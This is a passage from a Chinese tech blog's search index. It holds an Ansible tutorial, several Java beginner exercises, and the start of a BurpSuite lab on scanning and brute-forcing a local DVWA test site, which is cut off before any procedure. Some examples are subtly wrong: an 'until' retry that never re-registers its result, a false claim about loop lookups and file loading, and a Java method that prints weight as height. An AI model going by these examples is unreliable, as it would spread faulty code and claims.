的值来执行不同的操作：如果文件存在，则显示一条消息；如果文件不存在，则创建文件。\n总之，register 是 Ansible 中非常有用的功能，可以捕获任务的输出和状态，并在 playbook 中进行进一步的处理、判断和控制流程。\n3.8 Jinja2 模板的介绍和使用 Jinja2 是一种模板引擎，广泛用于将动态内容嵌入静态文本中，例如在配置文件、报告生成和文档自动生成等领域。在 Ansible 中，Jinja2 用于处理变量、条件语句和循环，以生成动态的配置文件和任务。\n基本概念：\nJinja2 模板引擎基于 Python，它允许你在文本中插入动态值、执行条件判断和循环操作。模板使用双大括号 {{ }} 来表示变量，{% %} 来表示控制语句，如条件和循环。\n使用方法：\n以下是一些常见的 Jinja2 模板用法示例：\n1. 插入变量：\nHello, {{ name }}! 这将会将 name 变量的值插入到文本中。\n2. 使用条件语句：\n{% if age \u0026gt; 18 %} You are an adult. {% else %} You are not yet an adult. {% endif %} 根据条件判断来显示不同的文本。\n3. 循环：\n{% for item in items %} - {{ item }} {% endfor %} 在循环中遍历列表 items 并为每个项目生成文本。\n4. 过滤器：\n{{ text | upper }} 使用过滤器将文本转换为大写。\n在 Ansible 中的应用：\n在 Ansible Playbooks 和模板中，你可以使用 Jinja2 来动态生成配置文件、任务和变量。例如，你可以在配置文件模板中插入主机和变量信息，然后使用 Ansible 将模板渲染为实际的配置文件。\n示例：\n假设你有一个 web_servers 主机组，并且你想为每台主机生成一个 Nginx 配置文件，其中包含主机的 IP 和端口信息。\nnginx.conf.j2 模板文件：\nserver { listen {{ nginx_port }}; server_name {{ ansible_host }}; location / { proxy_pass http://{{ ansible_host }}:{{ app_port }}; } } playbook.yml 文件：\n--- - name: Generate Nginx configs hosts: web_servers tasks: - name: Render Nginx config template: src: nginx.conf.j2 dest: /etc/nginx/sites-available/{{ ansible_host }} 在这个示例中，nginx.conf.j2 是一个 Jinja2 模板文件，使用了变量和控制语句来动态生成 Nginx 配置文件。template 模块会将模板渲染为实际的配置文件，放置在 /etc/nginx/sites-available 目录下，文件名与主机名相同。\n总结：\nJinja2 是一个强大的模板引擎，可以在 Ansible 中用于生成动态内容，从而提高配置管理和自动化部署的灵活性和效率。通过使用 Jinja2，你可以根据需要将变量、条件和循环嵌入到文本中，生成符合要求的配置和任务。\n3.9 循环和迭代 3.7.8 loop 在 Ansible 中，迭代和循环是非常重要的概念，它们允许你对一组主机或一组数据执行相同的操作。Ansible 提供了多种方法来实现迭代和循环，其中最常用的方法是使用 loop 关键字或 with_* 关键字系列。\n以下是 Ansible 中实现迭代和循环的一些方法：\n使用 loop 关键字： loop 关键字允许你在任务级别循环执行任务。你可以将其与 items 参数结合使用，传递一个列表或字典，然后在每次迭代中访问该列表或字典的元素。\n- name: Loop example debug: msg: \u0026#34;Item: {{ item }}\u0026#34; loop: - item1 - item2 - item3 使用 with_items： 在旧版本的 Ansible 中，你可能会看到 with_items 关键字，它在较新版本中已被 loop 替代（ansible 2.5+），但在一些旧代码中仍然可能会使用。\n- name: Loop example (with_items) debug: msg: \u0026#34;Item: {{ item }}\u0026#34; with_items: - item1 - item2 - item3 使用其他 with_* 关键字： Ansible 提供了多个 with_* 关键字，例如 with_dict、with_fileglob、with_sequence 等，用于在不同情况下进行循环操作。\n- name: Looping with a dictionary debug: msg: \u0026#34;Key: {{ item.key }}, Value: {{ item.value }}\u0026#34; with_dict: key1: value1 key2: value2 key3: value3 这些示例只是介绍了 Ansible 中迭代和循环的基本概念。你可以根据自己的需要，结合 Ansible 的模块和功能，更复杂地实现迭代和循环操作。无论你是在处理主机还是数据集，迭代和循环都能帮助你更高效地管理和配置系统。\n3.7.9 until 在Ansible中，\u0026ldquo;until\u0026rdquo; 是一个用于控制循环执行任务的关键字。它通常与 \u0026ldquo;register\u0026rdquo;（用于存储任务执行结果）和一些条件一起使用，以便在满足特定条件之前重复执行某个任务。\u0026ldquo;until\u0026rdquo; 的主要作用是允许任务在达到预期状态之前重试，直到满足特定条件为止。\n以下是 \u0026ldquo;until\u0026rdquo; 关键字的基本语法：\n- name: Retry a task until a condition is met some_module: # Replace with the actual module you\u0026#39;re using # module arguments... register: result # Store the task execution result in the \u0026#39;result\u0026#39; variable until: result is success # The condition to check, can be customized based on the task result retries: 10 # Number of times to retry the task delay: 10 # Time (in seconds) to wait between retries 在上面的示例中，\u0026ldquo;some_module\u0026rdquo; 是要执行的任务模块，\u0026ldquo;result\u0026rdquo; 是用于存储任务执行结果的变量。通过 \u0026ldquo;until\u0026rdquo; 关键字，你可以指定一个条件来检查任务执行结果是否满足预期。如果条件不满足，任务将在 \u0026ldquo;retries\u0026rdquo; 次数内重复执行，每次重试之间会等待 \u0026ldquo;delay\u0026rdquo; 秒。\n这是一个更具体的示例，假设你要等待某个服务启动成功后才继续执行后续任务：\n- name: Start the service systemd: name: my-service state: started register: service_result - name: Wait for the service to be up wait_for: host: localhost port: 8080 until: service_result is success retries: 10 delay: 5 在这个示例中，首先使用 \u0026ldquo;systemd\u0026rdquo; 模块启动了一个名为 \u0026ldquo;my-service\u0026rdquo; 的服务，并将结果存储在 \u0026ldquo;service_result\u0026rdquo; 变量中。接下来，使用 \u0026ldquo;wait_for\u0026rdquo; 模块等待 localhost 的 8080 端口开放，直到 \u0026ldquo;service_result\u0026rdquo; 变量的值变为 \u0026ldquo;success\u0026rdquo;，或者达到最大重试次数为止。\n请注意，\u0026ldquo;until\u0026rdquo; 并不是所有Ansible模块都支持的参数，只有部分模块（如 \u0026ldquo;wait_for\u0026rdquo;、\u0026ldquo;command\u0026rdquo; 等）允许在任务级别使用 \u0026ldquo;until\u0026rdquo; 来执行条件判断和循环操作。\n3.7.10 with_lines 在 Ansible 中，with_lines 是一个用于在任务中遍历文本行的循环构造。它允许你将每一行作为一个迭代项，以便在每次迭代中执行任务。\n以下是 with_lines 的基本语法：\n- name: Perform tasks with each line of a file some_module: # Replace with the actual module you\u0026#39;re using # module arguments... with_lines: - /path/to/file.txt # Path to the file containing lines to iterate over 在上述示例中，some_module 是要执行的任务模块，/path/to/file.txt 是包含要迭代的文本行的文件的路径。\n这是一个更具体的示例，假设你有一个文本文件，其中包含一些IP地址，你想使用 ping 命令对每个IP地址执行网络连接测试：\n- name: Ping each IP address from a file ping: with_lines: - /path/to/ip_addresses.txt 在这个示例中，ping 模块将会对文件 /path/to/ip_addresses.txt 中的每个IP地址执行网络连接测试。Ansible会将文件的每一行作为一个迭代项传递给 ping 模块。\n需要注意的是，with_lines 在处理大型文件时可能会导致性能问题，因为它需要一次性读取整个文件并将其加载到内存中。如果文件较大，你可能需要考虑使用更适合的方法，例如将文件内容存储在变量中，然后使用循环结构遍历变量。\n另外，从 Ansible 2.5 版本开始，with_lines 已被弃用，建议使用 loop 构造代替。以下是如何使用 loop 来完成上述示例：\n- name: Ping each IP address from a file ping: loop: \u0026#34;{{ lookup(\u0026#39;file\u0026#39;, \u0026#39;/path/to/ip_addresses.txt\u0026#39;).splitlines() }}\u0026#34; 在这个示例中，lookup('file', '/path/to/ip_addresses.txt').splitlines() 将会读取文件中的内容，并使用换行符将其拆分为行的列表，然后使用 loop 对每个IP地址执行 ping 模块。这种方法更为灵活且不会一次性加载整个文件。\n3.10 条件判断 when 在 Ansible 中，when 是一个条件语句，它允许你在任务执行之前指定一个条件，只有当条件满足时，任务才会被执行。这可以用于根据不同的情况来决定是否跳过或执行某个任务。\n以下是 when 的基本语法：\n- name: Perform a task conditionally some_module: # Replace with the actual module you\u0026#39;re using # module arguments... when: condition # The condition to check before executing the task 在上述示例中，some_module 是要执行的任务模块，condition 是一个表达式，只有在表达式评估为 true 时，任务才会被执行。\n这是一个更具体的示例，假设你只想在操作系统是 Ubuntu 时才执行特定的任务：\n- name: Install a package only on Ubuntu apt: name: some-package state: present when: ansible_distribution == \u0026#39;Ubuntu\u0026#39; 在这个示例中，apt 模块用于安装软件包，但是只有当 Ansible 变量 ansible_distribution 的值为 \u0026lsquo;Ubuntu\u0026rsquo; 时，任务才会被执行。\nwhen 表达式可以是 Ansible 变量、事实（facts）、比较操作、逻辑运算等。你可以根据需要来创建复杂的条件来决定任务是否应该被执行。例如：\n- name: Perform a task only if a certain variable is true some_module: # module arguments... when: my_variable == true - name: Perform a task only if a file exists some_module: # module arguments... when: ansible_facts[\u0026#39;file_exists\u0026#39;] == true - name: Perform a task only if multiple conditions are true some_module: # module arguments... when: ansible_os_family == \u0026#39;Debian\u0026#39; and ansible_distribution_version | version_compare(\u0026#39;9\u0026#39;, \u0026#39;\u0026gt;=\u0026#39;) 请注意，when 是一个在任务级别使用的参数，它适用于单个任务。如果你希望在剧本（playbook）级别上设置条件，可以在每个任务中使用 block 结构，然后在 block 结构上使用 when 条件。\n3.11 分组 block 在 Ansible 中，block 是一个用于创建任务块的结构。它允许你将多个相关的任务组织在一起，以便在其中应用共同的条件、处理错误以及设置通用的参数。block 可以与 rescue 和 always 配合使用，以提供更丰富的任务控制和错误处理能力。\n以下是 block 结构的基本语法：\n- name: A playbook with a block hosts: target_hosts tasks: - block: # Start of the block - name: Task 1 some_module: # module arguments... - name: Task 2 some_module: # module arguments... rescue: # Optional, tasks to run if an error occurs within the block - name: Rescue task some_module: # module arguments... always: # Optional, tasks to run regardless of success or failure - name: Always task some_module: # module arguments... 在上述示例中，block 结构内包含两个任务（Task 1 和 Task 2）。如果 block 结构内的任务中的任何一个失败，那么 rescue 部分的任务将会被执行。无论 block 结构内的任务成功与否，always 部分的任务都会被执行。\n以下是一个更具体的示例，展示了 block 结构如何与错误处理和条件一起使用：\n- name: Install a package with error handling hosts: target_hosts tasks: - block: - name: Install the package apt: name: some-package state: present rescue: - name: Handle error debug: msg: \u0026#34;An error occurred while installing the package.\u0026#34; always: - name: Clean up apt: name: some-package state: absent 在这个示例中，block 结构内的任务尝试安装一个软件包。如果安装过程中出现错误，rescue 部分的任务会被执行，显示一条错误消息。无论是否出现错误，always 部分的任务都会被执行，确保最终将软件包从系统中移除。\n使用 block 结构可以使剧本更具可读性，减少冗余代码，并提供更好的错误处理机制，因为你可以集中管理错误的处理方式。\n3.12 changed_when 当确定某个 task 不会对被控制端做修改时但执行结果却显示是黄色的 changed 状态, 可以通过changed_when: false 关闭 changed 状态\n在 Ansible 中，changed_when 是一个用于控制任务是否被标记为已更改（changed）的选项。默认情况下，如果任务执行导致了任何状态更改，该任务将被标记为已更改。然而，通过使用 changed_when，你可以自定义标记任务是否已更改的条件，而不仅仅依赖于默认的状态变化检测。\nchanged_when 允许你在任务级别设置一个条件表达式。如果该表达式评估为 true，那么任务将被标记为已更改。如果该表达式评估为 false，那么任务将被标记为未更改。\n以下是 changed_when 的基本语法：\n- name: Task with custom change condition some_module: # Replace with the actual module you\u0026#39;re using # module arguments... changed_when: condition_expression 在上述示例中，some_module 是要执行的任务模块，condition_expression 是一个自定义条件表达式，用于判断是否将任务标记为已更改。\n这是一个示例，展示如何使用 changed_when 控制任务是否被标记为已更改：\n- name: Run a command and control changed status command: echo \u0026#34;Hello, world!\u0026#34; register: command_output changed_when: \u0026#34;command_output.stdout != \u0026#39;Hello, world!\\n\u0026#39;\u0026#34; 在这个示例中，command 模块执行一个命令来输出 \u0026ldquo;Hello, world!\u0026quot;，并将输出结果存储在 command_output 变量中。通过使用 changed_when，我们指定了一个条件表达式，只有当命令的输出不等于 \u0026ldquo;Hello, world!\\n\u0026rdquo; 时，该任务才会被标记为已更改。\n通过使用 changed_when，你可以更精确地控制任务的更改状态，而不受默认状态变化检测的限制。这在某些情况下很有用，特别是当任务的状态变化可能不直接与输出结果相关时。\n3.13 滚动执行 serial 滚动执行（Rolling Deployment）是一种软件部署策略，用于将新版本的软件逐步部署到生产环境，而不是一次性将所有实例都更新为新版本。这种部署策略旨在减少风险，确保系统的可用性和稳定性，因为如果在全面部署新版本后出现问题，可能会影响整个系统。\n在滚动执行中，新版本的软件会首先部署到一小部分服务器（通常是一组）上，然后进行测试和验证。一旦新版本在这些服务器上得到确认，就会逐步将新版本应用于其他服务器，逐步增加服务器数量，直到所有服务器都完成了升级。\n在 Ansible 中，你可以通过编写适当的剧本（playbook）和任务，以及使用 serial 参数来实现滚动执行。serial 参数允许你指定每次在多少个目标主机上运行任务。这使得你可以控制在一次部署中逐步更新多少台主机。\n以下是使用 Ansible 实现滚动执行的示例：\n- name: Rolling deployment with Ansible hosts: target_hosts serial: 2 # Number of hosts to update simultaneously in each batch tasks: - name: Deploy new version some_module: # Replace with the actual module you\u0026#39;re using # module arguments... 在上述示例中，serial: 2 表示每次将同时在两台目标主机上运行任务。这会使得每次部署只更新两台主机，然后逐步增加更新数量，直到所有目标主机都完成升级。\n请注意，实际的滚动执行策略可能因组织的需求和应用程序的特性而有所不同。你可以根据实际情况来调整 serial 参数的值以及部署任务的其他参数，以满足你的部署策略和可用性要求。\n3.14 delegate_to 在 Ansible 中，delegate_to 是一个用于指定任务应该在哪个远程主机上执行的参数。通过使用 delegate_to，你可以将任务委托给一个特定的主机执行，而不是默认在目标主机上执行。\n这是一个示例，展示如何使用 delegate_to 将任务委托给另一个主机执行：\n- name: Run a task on a specific host command: echo \u0026#34;This task runs on a different host\u0026#34; delegate_to: specific_host 在这个示例中，command 模块将执行 echo 命令，但是任务会被委托给 specific_host 执行，而不是默认的目标主机。\n需要注意的是，delegate_to 参数通常用于特定的情况，例如需要在特定主机上执行一些配置管理任务、收集信息或执行某些故障排除操作时。在大多数情况下，任务将在目标主机上执行，而不需要使用 delegate_to。\n3.15 run_onece 在 Ansible 中，run_once 是一个用于控制任务是否仅在一个主机上运行的参数。通常情况下，Ansible 会在目标主机上的每个主机上运行任务。但是，有时你可能只希望在所有目标主机中的一个上运行任务，而不是在每个主机上都运行。\n这是一个示例，展示如何使用 run_once 使任务只在一个主机上运行：\n- name: Run a task only once command: echo \u0026#34;This task runs only once\u0026#34; run_once: true 在这个示例中，command 模块会执行 echo 命令，但是该任务只会在目标主机中的一个主机上运行。\n使用 run_once 参数通常用于一些只需在整个剧本中执行一次的任务，例如收集汇总信息或配置初始化。注意，run_once 并不会影响其他任务的执行方式，其他任务仍然会在每个目标主机上运行。\n3.16 环境变量 environment 在 Ansible 中，environment 是一个参数，用于在任务级别设置环境变量。通过使用 environment 参数，你可以为任务设置特定的环境变量，这些变量将在任务执行期间对命令、脚本等操作产生影响。\n这是一个示例，展示如何使用 environment 参数设置环境变量：\n- name: Run a task with custom environment variables command: echo \u0026#34;VAR1 is $VAR1, VAR2 is $VAR2\u0026#34; environment: VAR1: value1 VAR2: value2 在这个示例中，command 模块会执行 echo 命令，打印出由 environment 参数指定的环境变量值。\n使用 environment 参数可以让你在任务执行过程中设置临时环境变量，这对于定制任务行为、传递配置信息或设置执行环境非常有用。这些环境变量只会在任务执行期间生效，不会影响到其他任务或目标主机的状态。\n3.17 include 和 import 在 Ansible 中，你可以使用 include 和 import 语句来实现 YAML 文件之间的相互调用和重用。这可以帮助你组织和管理大型的 Ansible 剧本，使其更加模块化和易于维护。\n以下是一个示例，演示了如何使用 include 和 import_playbook 来实现 YAML 文件之间的相互调用和重用。\n假设我们有以下文件结构：\nansible_project/ ├── main_playbook.yml ├── tasks/ │ ├── common_tasks.yml │ ├── task1.yml │ └── task2.yml └── playbooks/ └── other_playbook.yml main_playbook.yml 是主剧本文件，它引入了其他文件并定义了一些任务。 - name: Main Playbook hosts: target_hosts tasks: - include: tasks/common_tasks.yml - include: tasks/task1.yml - include: tasks/task2.yml - import_playbook: playbooks/other_playbook.yml common_tasks.yml 文件包含一些公共任务，这些任务可以被多个剧本重用。 - name: Common Task 1 debug: msg: \u0026#34;This is a common task.\u0026#34; - name: Common Task 2 debug: msg: \u0026#34;Another common task.\u0026#34; task1.yml 文件包含特定的任务。 - name: Task 1 debug: msg: \u0026#34;Task 1 is executed.\u0026#34; task2.yml 文件也包含特定的任务。 - name: Task 2 debug: msg: \u0026#34;Task 2 is executed.\u0026#34; other_playbook.yml 是另一个独立的剧本。 - name: Other Playbook hosts: other_hosts tasks: - name: Task in Other Playbook debug: msg: \u0026#34;This task is from another playbook.\u0026#34; 在这个示例中，main_playbook.yml 引入了多个文件并定义了一系列任务。common_tasks.yml 包含了一些公共任务，这些任务可以在主剧本和其他剧本中重用。task1.yml 和 task2.yml 分别包含特定的任务。other_playbook.yml 是另一个独立的剧本，它可以被导入到主剧本中。\n通过这种方式，你可以将 Ansible 代码模块化，提高可维护性，并根据需要重用任务和剧本。\n4 Ansible Roles Ansible 角色是一种用于组织和重用 Ansible 代码的结构化方式。角色允许你将任务、变量、模板和处理逻辑组织成一个可独立调用的单元，使得你能够更好地管理复杂的剧本和部署。\n角色的组织结构如下：\nmy_role/ ├── tasks/ │ ├── main.yml │ ├── task1.yml │ └── task2.yml ├── vars/ │ └── main.yml ├── templates/ │ ├── template1.j2 │ └── template2.j2 └── meta/ └── main.yml tasks/ 目录包含主任务文件 main.yml，以及其他任务文件如 task1.yml 和 task2.yml，这些文件包含要执行的任务。 vars/ 目录包含变量文件 main.yml，这些变量可以在角色中使用。 templates/ 目录包含模板文件，这些文件可以在角色中使用作为配置文件模板。 meta/ 目录包含角色元数据文件 main.yml，其中包含有关角色的信息，如作者、依赖等。 以下是一个示例，展示如何创建和使用 Ansible 角色。\n创建一个名为 my_role 的角色目录结构： ansible_project/ └── roles/ └── my_role/ ├── tasks/ │ └── main.yml ├── vars/ │ └── main.yml ├── templates/ │ └── template1.j2 └── meta/ └── main.yml 编辑 my_role/tasks/main.yml 文件，定义要执行的任务： - name: Task 1 in Role debug: msg: \u0026#34;Task 1 of my_role is executed.\u0026#34; - name: Task 2 in Role debug: msg: \u0026#34;Task 2 of my_role is executed.\u0026#34; 编辑 my_role/vars/main.yml 文件，定义角色变量： role_var1: value1 role_var2: value2 编辑 my_role/templates/template1.j2 文件，创建一个配置文件模板： [Section] var1 = {{ role_var1 }} var2 = {{ role_var2 }} 编辑 my_role/meta/main.yml 文件，定义角色元数据： galaxy_info: author: Your Name description: A sample Ansible role license: MIT min_ansible_version: 2.9 platforms: - name: Fedora versions: - all - name: Ubuntu versions: - all 在主剧本中使用角色： - name: Playbook using the role hosts: target_hosts roles: - my_role 在这个示例中，my_role 角色被定义为一个独立的目录，其中包含了任务、变量、模板和元数据。主剧本通过 roles 部分引用了这个角色，并在目标主机上执行了角色中的任务和操作。\n使用角色可以使 Ansible 代码更加模块化、易于维护和重用，特别是在处理多个项目、环境或应用程序时。\n","permalink":"https://senmer.github.io/zh/posts/tech/ansible/ansible/","summary":"1 Ansible 简介 1.1 Ansible 发展史 作者：Michael DeHaan（ Cobbler 与 Func 作者） Ansible 的名称来自科幻小说《安德的游戏》中跨越时空的即时通信工具，使用它可以在相距数光年的距离，远程实时控制前线的舰队战斗。 2012-03-09，发布0.0.1版，2015-10-17，Red Hat宣布1.5亿美元收购An","title":"Ansible"},{"content":"第一题：创建一个List集合的对象，添加几条数据，将1号位和2号位交换；获得最大值，最小值打印出来，最后再遍历该集合并把元素打印出来\n第二题 现在有一个map集合如下： Map\u0026lt;Integer,String\u0026gt; map = new HashMap\u0026lt;Integer, String\u0026gt;(); map.put(1, \u0026ldquo;张三丰\u0026rdquo;); map.put(2, \u0026ldquo;周芷若\u0026rdquo;); map.put(3, \u0026ldquo;汪峰\u0026rdquo;); map.put(4, \u0026ldquo;灭绝师太\u0026rdquo;); 要求： 1.遍历集合，并将序号与对应人名打印。 2.向该map集合中插入一个编码为5姓名为李晓红的信息 3.移除该map中的编号为1的信息 4.将map集合中编号为2的姓名信息修改为周林\n1. 单列集合List import java.util.ArrayList; import java.util.Collections; public class ListDemo { public static void main(String[] args) { ArrayList\u0026lt;Integer\u0026gt; myList = new ArrayList\u0026lt;\u0026gt;(); myList.add(10); myList.add(20); myList.add(30); System.out.println(\u0026#34;集合中的元素为：\u0026#34;); for(int i: myList) { System.out.println(i); } // 交换元素 Collections.swap(myList, 0, 1); // 获得最大值和最小值 int max = Collections.max(myList); int min = Collections.min(myList); System.out.println(\u0026#34;最大值：\u0026#34; + max); System.out.println(\u0026#34;最小值：\u0026#34; + min); // 遍历集合中的元素 System.out.println(\u0026#34;交换后集合中的元素为：\u0026#34;); for (int e : myList) { System.out.println(e); } } } 程序输出：\n集合中的元素为： 10 20 30 最大值：30 最小值：10 交换后集合中的元素为： 20 10 30 2. 双列集合Map import java.util.HashMap; import java.util.Map; public class MapDemo { public static void main(String[] args) { HashMap\u0026lt;Integer,String\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(1, \u0026#34;张三丰\u0026#34;); map.put(2, \u0026#34;周芷若\u0026#34;); map.put(3, \u0026#34;汪峰\u0026#34;); map.put(4, \u0026#34;灭绝师太\u0026#34;); // 遍历集合 for (Map.Entry\u0026lt;Integer, String\u0026gt; entry : map.entrySet()) { System.out.println(\u0026#34;序号：\u0026#34; + entry.getKey() + \u0026#34;，姓名：\u0026#34; + entry.getValue()); } // 插入信息 map.put(5, \u0026#34;李晓红\u0026#34;); // 移除信息 map.remove(1); // 修改信息，已有为修改，否则为添加 map.put(2, \u0026#34;周林\u0026#34;); // 遍历集合 System.out.println(\u0026#34;修改后的集合：\u0026#34;); for (Map.Entry\u0026lt;Integer, String\u0026gt; entry : map.entrySet()) { System.out.println(\u0026#34;序号：\u0026#34; + entry.getKey() + \u0026#34;，姓名：\u0026#34; + entry.getValue()); } } } 程序输出：\n序号：1，姓名：张三丰 序号：2，姓名：周芷若 序号：3，姓名：汪峰 序号：4，姓名：灭绝师太 修改后的集合： 序号：2，姓名：周林 序号：3，姓名：汪峰 序号：4，姓名：灭绝师太 序号：5，姓名：李晓红 ","permalink":"https://senmer.github.io/zh/posts/tech/java/java-%E9%9B%86%E5%90%88/","summary":"\u003cp\u003e第一题：创建一个List集合的对象，添加几条数据，将1号位和2号位交换；获得最大值，最小值打印出来，最后再遍历该集合并把元素打印出来\u003c/p\u003e\n\u003cp\u003e第二题 现在有一个map集合如下：\nMap\u0026lt;Integer,String\u0026gt; map = new HashMap\u0026lt;Integer, String\u0026gt;();\nmap.put(1, \u0026ldquo;张三丰\u0026rdquo;);\nmap.put(2, \u0026ldquo;周芷若\u0026rdquo;);\nmap.put(3, \u0026ldquo;汪峰\u0026rdquo;);\nmap.put(4, \u0026ldquo;灭绝师太\u0026rdquo;);\n要求：\n1.遍历集合，并将序号与对应人名打印。\n2.向该map集合中插入一个编码为5姓名为李晓红的信息\n3.移除该map中的编号为1的信息\n4.将map集合中编号为2的姓名信息修改为周林\u003c/p\u003e","title":"java-集合"},{"content":"1、定义手机类，手机有品牌(brand),价格(price)和颜色(color)三个属性，有打电话call()和sendMessage()两个功能。\n2、定义一个女朋友类。女朋友的属性包含：姓名，身高，体重。行为包含：洗衣服wash()，做饭cook()。\n1. 手机类 请定义出手机类，类中要有空参、有参构造方法，set/get方法。\n定义测试类，在主方法中使用空参构造创建对象，使用set方法赋值。\n调用对象的两个功能，打印效果如下：\n正在使用价格为3998元黑色的小米手机打电话\u0026hellip;. 正在使用价格为3998元黑色的小米手机发短信\u0026hellip;.\n在idea编辑器中，定义属性后，可以通过右键或者Alt + Insert快捷键快速生成构造方法和get/set方法\n手机类：Phone\npublic class Phone { private String brand; private double price; private String color; //定义无参构造方法 public Phone() { System.out.println(\u0026#34;调用无参构造方法\u0026#34;); } //定义有参构造方法 public Phone(String brand, double price, String color) { System.out.println(\u0026#34;调用有参构造方法\u0026#34;); this.brand = brand; this.price = price; this.color = color; } public String getBrand() { return brand; } public void setBrand(String brand) { this.brand = brand; } public double getPrice() { return price; } public void setPrice(double price) { this.price = price; } public String getColor() { return color; } public void setColor(String color) { this.color = color; } //打电话行为 public void call() { System.out.println(\u0026#34;正在使用价格为：\u0026#34; + this.price + \u0026#34;元\u0026#34; + this.color + \u0026#34;的\u0026#34; + this.brand + \u0026#34;手机打电话...\u0026#34;); } //发短信行为 public void sendMessage() { System.out.println(\u0026#34;正在使用价格为：\u0026#34; + this.price + \u0026#34;元\u0026#34; + this.color + \u0026#34;的\u0026#34; + this.brand + \u0026#34;手机发短信...\u0026#34;); } } 测试类：TestPhone\npublic class TestPhone { public static void main(String[] args) { Phone phone = new Phone(); phone.setBrand(\u0026#34;小米\u0026#34;); phone.setPrice(3998); phone.setColor(\u0026#34;黑色\u0026#34;); phone.call(); phone.sendMessage(); } } 程序输出：\n调用无参构造方法 正在使用价格为：3998.0元黑色的小米手机打电话... 正在使用价格为：3998.0元黑色的小米手机发短信... 2. 女朋友类。 我女朋友叫凤姐,身高155.0厘米,体重130.0斤 女朋友帮我洗衣服 女朋友给我做饭\n女朋友类：GirlFriend\npublic class Girlfriend { private String name; private double height; private double weight; public String getName() { return name; } public Girlfriend(String name, double height, double weight) { this.name = name; this.height = height; this.weight = weight; } public void setName(String name) { this.name = name; } public double getHeight() { return height; } public void setHeight(double height) { this.height = height; } public double getWeight() { return weight; } public void setWeight(double weight) { this.weight = weight; } public void show() { System.out.println(\u0026#34;我是\u0026#34; + getName() + \u0026#34;。我的身高是：\u0026#34; + getWeight() + \u0026#34;厘米, \u0026#34; + \u0026#34;我的体重是\u0026#34; + getWeight() + \u0026#34;斤...\u0026#34;); } public void wash() { System.out.println(\u0026#34;我会洗衣服\u0026#34;); } public void cook() { System.out.println(\u0026#34;我还会做饭\u0026#34;); } } 测试类：TestGirlfriend\npublic class TestGirlFriend { public static void main(String[] args) { Girlfriend girlfriend = new Girlfriend(\u0026#34;凤姐\u0026#34;, 155.0, 130); girlfriend.show(); girlfriend.wash(); girlfriend.cook(); } } 程序输出：\n我是凤姐。我的身高是：130.0厘米, 我的体重是130.0斤... 我会洗衣服 我还会做饭 ","permalink":"https://senmer.github.io/zh/posts/tech/java/java-%E7%B1%BB/","summary":"\u003cp\u003e1、定义手机类，手机有品牌(brand),价格(price)和颜色(color)三个属性，有打电话call()和sendMessage()两个功能。\u003c/p\u003e\n\u003cp\u003e2、定义一个女朋友类。女朋友的属性包含：姓名，身高，体重。行为包含：洗衣服wash()，做饭cook()。\u003c/p\u003e","title":"java-类"},{"content":"1、编写一个 Java 程序，求出从 1 到 100 中所有偶数的和。\n2、编写一个 Java 程序，求出一个给定正整数的所有因数。\n3、给定一个整型数组，编写一个 Java 程序，将该数组中的所有奇数元素存储到一个新数组中，并输出新数组中的元素。\n什么是因数? 在数学中，一个正整数的因数，是指能够整除该数且大于等于 1 的正整数，也称为该数的约数。例如，6 的因数为 1、2、3、6。而一个正整数不是质数时，其因数至少包括 1 和本身两个因数。\n1. 求和 public class GetNum { public static void main(String[] args) { int num = 100; //求和总数 int sum = 0; //累加和 for (int i = 1; i \u0026lt;= num; i++) if (i % 2 == 0) { sum += i; } System.out.println(\u0026#34;1-100的所有偶数和为：\u0026#34;+sum); } } 输出结果：\n1-100的所有偶数和为：2550 2. 求因数 import java.util.Scanner; public class GetFactor { public static void main(String[] args) { Scanner input = new Scanner(System.in); System.out.print(\u0026#34;请输入一个正整数：\u0026#34;); int num = input.nextInt(); System.out.print(num + \u0026#34;的因数有：\u0026#34;); for (int i = 1; i \u0026lt;= num; i++) { if (num % i == 0) { System.out.print(i + \u0026#34; \u0026#34;); } } } } 输出结果：\n请输入一个正整数：4 4的因数有：1 2 4 3. 求奇数 import java.util.Arrays; public class GetOddArray { public static void main(String[] args) { int[] array= {1, 2, 3, 4, 5, 6, 7, 8, 9}; int[] oddArray = getOddArray(array); System.out.println(\u0026#34;原数组：\u0026#34; + Arrays.toString(array)); System.out.println(\u0026#34;奇数数组：\u0026#34; + Arrays.toString(oddArray)); } public static int[] getOddArray(int[] arr){ //获得奇数个数以创建响应大小的数组 int count = 0; //奇数个数 for (int i = 0; i \u0026lt; arr.length; i++){ if (arr[i] % 2 != 0) { count++; } } //存储并返回所有奇数 int[] oddArr = new int[count]; int index=0; for (int i = 0; i \u0026lt; arr.length; i++) { if (arr[i] % 2 != 0) { oddArr[index++] = arr[i]; } } return oddArr; } } 输出结果：\n原数组：[1, 2, 3, 4, 5, 6, 7, 8, 9] 奇数数组：[1, 3, 5, 7, 9] ","permalink":"https://senmer.github.io/zh/posts/tech/java/java-%E5%BE%AA%E7%8E%AF/","summary":"\u003cp\u003e1、编写一个 Java 程序，求出从 1 到 100 中所有偶数的和。\u003c/p\u003e\n\u003cp\u003e2、编写一个 Java 程序，求出一个给定正整数的所有因数。\u003c/p\u003e\n\u003cp\u003e3、给定一个整型数组，编写一个 Java 程序，将该数组中的所有奇数元素存储到一个新数组中，并输出新数组中的元素。\u003c/p\u003e","title":"java-循环"},{"content":"1、使用Discover Content功能爬取任意站点的目录，给出爬取过程的说明文档、站点树截图；\n2、分别使用burp Scan的主动扫描和被动扫描功能对DVWA站点进行扫描，输出扫描报告；\n3、分别使用burp的狙击手模式（Sniper）和集束炸弹模式（Cluster bomb） 对DVWA的Brute Force模块进行爆破\n1 实验环境 软件名称 版本 部署方式 IP BurpSuite professional v2.0 windows安装 172.31.5.1 DVWA v1.10 Development docker run -d -p 80:80 \u0026ndash;name dvwa docker.io/sagikazarmark/dvwa 172.31.5.7 2 Discover Content dvwa 站点地址\n172.31.5.1\t","permalink":"https://senmer.github.io/zh/posts/tech/burp/burpsuite%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%88%86%E7%A0%B4/","summary":"\u003cp\u003e1、使用Discover Content功能爬取任意站点的目录，给出爬取过程的说明文档、站点树截图；\u003c/p\u003e\n\u003cp\u003e2、分别使用burp Scan的主动扫描和被动扫描功能对DVWA站点进行扫描，输出扫描报告；\u003c/p\u003e\n\u003cp\u003e3、分别使用burp的狙击手模式（Sniper）和集束炸弹模式（Cluster bomb） 对DVWA的Brute Force模块进行爆破\u003c/p\u003e","title":"BurpSuite扫描与爆破"},{"content":"等级保护\u0026amp;风险评估：了解基本测评流程，知道各角色岗位在测评工作中的职责，学习国标文件\n1 等级保护 1.1 